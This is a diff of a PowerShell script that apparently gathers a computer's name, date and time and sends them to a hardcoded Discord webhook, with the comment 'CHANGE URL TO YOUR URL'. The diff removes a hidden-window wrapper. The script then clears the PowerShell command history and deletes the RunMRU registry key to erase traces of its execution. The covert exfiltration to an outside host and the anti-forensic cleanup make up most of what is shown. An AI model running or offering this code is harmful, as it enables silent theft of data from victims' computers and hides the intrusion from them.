@@ -1,5 +1,3 @@
-PowerShell.exe -WindowStyle hidden {
-
 #CHANGE URL TO YOUR URL
   $url="https://discord.com/api/webhooks/1218944540405268643/nyDFOGn5KUvkNaf0yZSLjcoJyYTm6eQj5ZwZBuBj4D8Q8cZ9JPHqJ0rNLugT3AqZ3b9p" ;
 #Get PC Name+Date+Time
@@ -22,4 +20,3 @@ PowerShell.exe -WindowStyle hidden {
   [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
 # Clear run powershell
   Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU;
-}
